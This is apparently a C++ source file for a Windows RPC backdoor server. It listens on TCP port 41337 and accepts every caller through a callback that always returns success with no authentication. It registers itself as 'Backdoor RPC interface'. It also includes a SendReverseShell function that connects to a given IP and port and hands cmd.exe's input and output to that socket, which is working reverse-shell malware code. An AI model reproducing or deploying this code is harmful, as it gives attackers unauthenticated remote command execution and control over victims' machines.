#include <stdlib.h>
#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include "RemotePrivilegeCall.h"
// Links the rpcrt4.lib that exposes the WinAPI RPC functions
#pragma comment(lib, "rpcrt4.lib")
// Links the ws2_32.lib which contains the socket functions
#pragma comment(lib, "ws2_32.lib")

// Function that sends the reverse shell
void SendReverseShell(wchar_t* ip_address, int port){
	printf("Sending reverse shell to: %ws:%d\n", ip_address, port);
	WSADATA wsaData;
	SOCKET s1;
	struct sockaddr_in hax;
	char ip_addr_ascii[16];
	STARTUPINFO sui;
	PROCESS_INFORMATION pi;
	sprintf(ip_addr_ascii, "%ws", ip_address );
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	hax.sin_port = htons(port);
	hax.sin_addr.s_addr = inet_addr(ip_addr_ascii);

	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;

	LPSTR commandLine = "cmd.exe";
	CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
}

// Security callback function
RPC_STATUS CALLBACK SecurityCallback(RPC_IF_HANDLE Interface, void* pBindingHandle){
    return RPC_S_OK; // Whoever binds to the interface, we will allow the connection
}

int main()
{
    RPC_STATUS status; // Used to store the RPC function returns
	RPC_BINDING_VECTOR* pbindingVector = 0;

	// Specify the Rpc endpoints options
	status = RpcServerUseProtseqEpW(
		(RPC_WSTR)L"ncacn_ip_tcp",      // Endpoint to contact
		RPC_C_PROTSEQ_MAX_REQS_DEFAULT, // Default value
		(RPC_WSTR)L"41337",             // Listening port 
		NULL                            // Pointer to a security context (we don't care about that)
	);                         

	// Register the interface to the RPC runtime
	status = RpcServerRegisterIf2(
		RemotePrivilegeCall_v1_0_s_ifspec,   // Name of the interface defined in RemotePrivilegeCall.h
		NULL,                                // UUID to bind to (NULL means the one from the MIDL file)
		NULL,                                // Interface to use (NULL means the one from the MIDL file)
		RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH, // Invoke the security callback function
		RPC_C_LISTEN_MAX_CALLS_DEFAULT,      // Numbers of simultaneous connections
		(unsigned)-1,                        // Maximum size of data block received 
		SecurityCallback                     // Name of the function that acts as the security callback
	);                   

	// Register the interface to the epmapper
	status = RpcServerInqBindings(&pbindingVector);
	status = RpcEpRegisterW(
		RemotePrivilegeCall_v1_0_s_ifspec,   // Name of the interface defined in RemotePrivilegeCall.h
		pbindingVector,                      // Structure contening the binding vectors
		0,                                   // 
		(RPC_WSTR)L"Backdoor RPC interface"  // Name of the interface as exposed on port 135    
	);

	// Launch the interface
	status = RpcServerListen(
		1,                                   // Minimum number of connections
		RPC_C_LISTEN_MAX_CALLS_DEFAULT,      // Maximum number of connetions
		FALSE                                // Starts the interface immediately
	);                              
}

// Function used to allocate memory to the interface
void* __RPC_USER midl_user_allocate(size_t size){
    return malloc(size);
}

// Function used to free memory allocated to the interface
void __RPC_USER midl_user_free(void* p){
    free(p);
}
